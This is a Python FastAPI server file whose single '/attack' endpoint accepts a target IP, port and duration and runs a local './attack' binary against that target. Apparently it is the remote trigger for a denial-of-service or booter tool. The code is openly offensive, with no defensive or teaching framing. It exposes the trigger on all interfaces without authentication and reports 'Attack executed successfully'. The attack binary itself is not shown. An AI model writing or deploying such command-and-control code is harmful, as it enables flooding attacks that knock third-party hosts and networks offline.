from fastapi import FastAPI, HTTPException
from pydantic import BaseModel, Field, IPvAnyAddress
import logging
import subprocess

app = FastAPI()

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class AttackRequest(BaseModel):
    ip: IPvAnyAddress
    port: int = Field(..., ge=1, le=65535, description="Port number must be between 1 and 65535")
    duration: int = Field(..., gt=0, description="Duration must be a positive integer")

@app.post("/attack")
async def receive_attack_command(payload: AttackRequest):
    ip = payload.ip
    port = payload.port
    duration = payload.duration

    logger.info(f"Received Attack Request | Target IP: {ip}, Port: {port}, Duration: {duration} seconds")

    try:
        # Binary file path
        binary_path = "./attack"

        # Build the command
        command = [binary_path, str(ip), str(port), str(duration)]
        
        # Execute the command
        result = subprocess.run(
            command,
            capture_output=True,
            text=True,
            check=True
        )

        # Log and return output
        logger.info(f"Binary Output: {result.stdout}")
        return {"status": "Success", "message": "Attack executed successfully", "output": result.stdout}

    except subprocess.CalledProcessError as e:
        logger.error(f"Error executing binary: {e.stderr}")
        raise HTTPException(status_code=500, detail=f"Error executing binary: {e.stderr}")

    except Exception as e:
        logger.error(f"Unexpected error: {str(e)}")
        raise HTTPException(status_code=500, detail=f"Unexpected error: {str(e)}")

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)
